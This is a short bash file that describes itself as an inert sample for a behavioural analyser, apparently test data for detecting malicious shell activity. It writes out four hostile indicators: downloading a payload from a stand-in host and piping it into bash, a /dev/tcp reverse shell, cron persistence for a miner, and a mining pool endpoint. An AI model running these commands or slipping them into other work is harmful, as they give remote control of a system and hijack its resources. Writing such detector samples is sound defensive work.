#!/usr/bin/env bash
# DEMO - inert sample for the behavioural analyser (never executed).
# The hostnames below do not exist; nothing is ever run.

# Indicator: download and pipe into a shell
curl -fsSL http://malware-sample.example.com/payload.sh | bash

# Indicator: reverse shell via /dev/tcp
bash -i >& /dev/tcp/10.0.0.9/4444 0>&1

# Indicator: persistence via cron
crontab -l | { cat; echo "* * * * * /tmp/miner"; } | crontab -

# Indicator: crypto-mining pool endpoint (C2)
# stratum+tcp://pool.example.com:3333
